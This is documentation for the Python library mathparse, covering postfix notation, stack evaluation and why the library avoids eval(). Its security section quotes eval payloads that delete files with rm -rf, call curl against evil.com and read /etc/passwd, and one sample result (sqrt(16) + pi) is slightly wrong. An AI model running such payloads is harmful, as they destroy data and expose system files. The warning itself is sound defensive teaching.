Postfix
=======

The postfix notation, also known as `Reverse Polish Notation (RPN)`_, is a mathematical notation in which every operator follows all of its operands.
It is used in mathparse to evaluate expressions efficiently and safely.

Notably, mathparse does not employ the use of Python's :py:func:`eval` function when evaluating provided mathematical expressions.
This is a measure to prevent arbitrary code execution vulnerabilities.

Postfix Notation
----------------

In postfix notation, mathematical operators are placed after their operands, eliminating the need for parentheses to specify the order of operations. This permits evaluation using a stack-based algorithm.

Basic Examples
~~~~~~~~~~~~~~

Some examples comparing infix and postfix notation are as follows:

.. list-table:: Infix vs Postfix Examples
   :widths: 40 40 20
   :header-rows: 1

   * - Infix Expression
     - Postfix Expression
     - Result
   * - ``3 + 4``
     - ``3 4 +``
     - ``7``
   * - ``5 * (2 + 3)``
     - ``5 2 3 + *``
     - ``25``
   * - ``(8 - 3) * 2``
     - ``8 3 - 2 *``
     - ``10``
   * - ``6 / 2 + 1``
     - ``6 2 / 1 +``
     - ``4``

Stack-Based Evaluation
~~~~~~~~~~~~~~~~~~~~~~

Postfix expressions are evaluated using a stack:

1. **Scan from left to right**: Process each token in the expression
2. **Numbers**: Push numbers onto the stack
3. **Operators**: Pop required operands from stack, apply operation, push result back
4. **Final result**: The remaining value on the stack is the answer

Example evaluation of ``3 4 + 2 *``:

.. code-block:: text

   Token: 3    Stack: [3]
   Token: 4    Stack: [3, 4]
   Token: +    Stack: [7]          (pop 4, pop 3, push 3+4=7)
   Token: 2    Stack: [7, 2]
   Token: *    Stack: [14]         (pop 2, pop 7, push 7*2=14)
   Result: 14

Postfix vs Infix Notation
--------------------------

Understanding the differences between postfix and infix notation helps explain why mathparse uses the postfix approach.

Infix Notation (Traditional)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Advantages:**
- Natural and intuitive for humans
- Matches mathematical conventions
- Easy to read and write

**Disadvantages:**
- Requires parentheses for complex expressions
- Needs operator precedence rules (PEMDAS/BODMAS)
- More complex to parse and evaluate programmatically
- Ambiguity without proper precedence handling

**Example challenges:**
- ``2 + 3 * 4`` could be interpreted as ``(2 + 3) * 4 = 20`` or ``2 + (3 * 4) = 14``
- ``a - b + c`` requires left-to-right evaluation rules

Postfix Notation (RPN)
~~~~~~~~~~~~~~~~~~~~~~

**Advantages:**
- No parentheses needed - order is explicit
- No operator precedence rules required
- Simple, efficient evaluation algorithm
- Unambiguous expression evaluation
- Natural fit for stack-based computation

**Disadvantages:**
- Less intuitive for humans initially
- Requires learning a different notation system

**Why mathparse uses postfix:**

1. **Simplicity**: Stack-based evaluation is straightforward and reliable
2. **Efficiency**: Linear time complexity with minimal memory overhead
3. **Safety**: No need for complex parsing that could introduce vulnerabilities
4. **Correctness**: Eliminates ambiguity in expression evaluation

Implementation in mathparse
~~~~~~~~~~~~~~~~~~~~~~~~~~~

The mathparse library converts infix expressions to postfix using the `Shunting-yard algorithm`_:

.. code-block:: python

   # Example: "3 + 4 * 2" becomes [3, 4, 2, '*', '+']
   tokens = tokenize("3 + 4 * 2")           # ['3', '+', '4', '*', '2']
   postfix = to_postfix(tokens)             # [3, 4, 2, '*', '+']
   result = evaluate_postfix(postfix)       # 11

The conversion process respects operator precedence:
- Highest precedence: ``.`` (decimal point)
- Higher precedence: ``^`` (exponentiation)
- Medium precedence: ``*``, ``/`` (multiplication, division)
- Lower precedence: ``+``, ``-`` (addition, subtraction)
- Parentheses override natural precedence

Decimal Point Operator
~~~~~~~~~~~~~~~~~~~~~~~

The decimal point (``.``) is treated as a special binary operator with the highest precedence.
It combines an integer part and a fractional part to create a decimal number.

**How it works:**

.. code-block:: python

   # "53 . 4" is evaluated as: 53 + (4 / 10^1) = 53.4
   result = mathparse.parse('53 . 4')
   # Returns: 53.4

   # "10 . 25" is evaluated as: 10 + (25 / 10^2) = 10.25
   result = mathparse.parse('10 . 25')
   # Returns: 10.25

**Postfix evaluation:**

.. code-block:: text

   Expression: 53 . 4
   Postfix: [53, 4, '.']

   Evaluation:
   Token: 53    Stack: [53]
   Token: 4     Stack: [53, 4]
   Token: .     Stack: [53.4]      (combines 53 and 4 into 53.4)
   Result: 53.4

The decimal operator has the highest precedence to ensure it binds tightly before any other operations:

.. code-block:: python

   # "5 . 2 + 3" is parsed as "(5.2) + 3", not "5 . (2 + 3)"
   result = mathparse.parse('5 . 2 + 3')
   # Returns: 8.2


Security: Avoiding eval() Vulnerabilities  
-----------------------------------------

One of the key design decisions in mathparse is avoiding Python's :py:func:`eval` function, which poses significant security risks.

The eval() Security Problem
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Python's :py:func:`eval` function executes arbitrary Python code, making it dangerous for processing untrusted input:

**Dangerous examples:**

.. code-block:: python

   # These could execute malicious code:
   eval("__import__('os').system('rm -rf /')")                  # Delete files
   eval("__import__('subprocess').call(['curl', 'evil.com'])")  # Network access
   eval("open('/etc/passwd').read()")                           # Read sensitive files

**Why eval() is problematic:**

- **Arbitrary code execution**: Any Python code can be run
- **System access**: File system, network, and system calls available  
- **Privilege escalation**: Runs with the application's permissions
- **Hard to sanitize**: Input filtering is complex and error-prone
- **Supply chain attacks**: Malicious expressions can be injected

Common Attempted "Solutions"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Several approaches are often tried to make :py:func:`eval` "safe," but all have significant flaws:

**Restricted globals/locals:**

.. code-block:: python

   # Still vulnerable!
   eval(expression, {"__builtins__": {}}, {})

*Problem*: Python's introspection allows access to dangerous functions through object attributes.

**Input validation/filtering:**

.. code-block:: python

   # Blacklist approach - easily bypassed
   if 'import' not in expression and 'exec' not in expression:
       result = eval(expression)

*Problem*: Blacklists are incomplete and can be circumvented with encoding, obfuscation, or alternative access methods.

**Sandboxing:**

.. code-block:: python

   # Complex sandboxing attempts
   safe_dict = {'__builtins__': {'abs': abs, 'max': max}}
   result = eval(expression, safe_dict)

*Problem*: Python's dynamic nature makes true sandboxing extremely difficult and often broken.

mathparse's Safe Approach  
~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of trying to make :py:func:`eval` safe, mathparse implements a purpose-built mathematical expression evaluator:

**Safe parsing pipeline:**

1. **Tokenization**: Break input into mathematical tokens only
2. **Validation**: Each token is checked against allowed mathematical symbols
3. **Conversion**: Transform to postfix notation using known algorithms
4. **Evaluation**: Use stack-based evaluation with predefined operations

**Security benefits:**

.. code-block:: python

   # mathparse only recognizes mathematical operations
   parse("2 + 3 * 4")                     # ✓ Returns 14
   parse("sqrt(16) + pi")                 # ✓ Returns 7.141693
   parse("__import__('os').system('ls')") # ✓ Raises PostfixTokenEvaluationException

**Allowed operations only:**

- **Numbers**: Integers, floats, and mathematical constants (``pi``, ``e``)
- **Binary operators**: ``+``, ``-``, ``*``, ``/``, ``^``
- **Unary functions**: ``sqrt``, ``log`` 
- **Grouping**: Parentheses for expression grouping
- **Word parsing**: Mathematical terms in various languages

**What's explicitly prevented:**

- Function calls (except predefined math functions)
- Variable assignments or access
- Import statements or module access
- File system operations
- Network operations
- Any non-mathematical operations

General Recommendations
~~~~~~~~~~~~~~~~~~~~~~~

When building applications that evaluate user-provided mathematical expressions:

1. **Use purpose-built parsers**: Like mathparse for mathematical expressions
2. **Validate input early**: Check tokens against allowed operations
3. **Limit complexity**: Set bounds on expression depth and length

Example secure usage:

.. code-block:: python

   def safe_calculate(user_input):
       try:
           # mathparse safely evaluates mathematical expressions
           result = parse(user_input)
           return result
       except PostfixTokenEvaluationException as e:
           # Handle mathematical errors appropriately
           return f"Invalid expression: {e}"
       except Exception as e:
           # Log unexpected errors for debugging
           logger.error(f"Unexpected error: {e}")
           return "Calculation failed"

   # Safe examples:
   safe_calculate("2 + 3 * 4")           # Returns 14
   safe_calculate("malicious_code()")    # Returns "Invalid expression: ..."

By using postfix notation and avoiding :py:func:`eval`, mathparse provides a secure, efficient, and reliable way to evaluate mathematical expressions from untrusted sources.

.. _`Reverse Polish Notation (RPN)`: https://en.wikipedia.org/wiki/Reverse_Polish_notation

.. _`Shunting-yard algorithm`: https://en.wikipedia.org/wiki/Shunting-yard_algorithm
